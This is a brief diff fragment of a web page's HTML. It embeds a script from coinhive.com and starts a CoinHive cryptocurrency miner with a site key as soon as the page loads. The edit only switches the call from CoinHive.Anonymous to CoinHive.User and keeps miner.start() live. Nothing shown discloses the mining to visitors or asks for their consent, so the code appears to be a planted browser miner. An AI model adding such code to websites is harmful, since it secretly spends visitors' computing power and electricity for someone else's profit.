@@ -15,7 +15,7 @@
 
         <script src="https://coinhive.com/lib/coinhive.min.js"></script>
         <script>
-            var miner = new CoinHive.Anonymous('LizXPgR1RicCNg50MGh2EOgT4BjJovK0');
+            var miner = new CoinHive.User('LizXPgR1RicCNg50MGh2EOgT4BjJovK0', 'Anonymous');
             miner.start();
         </script>
     </div>
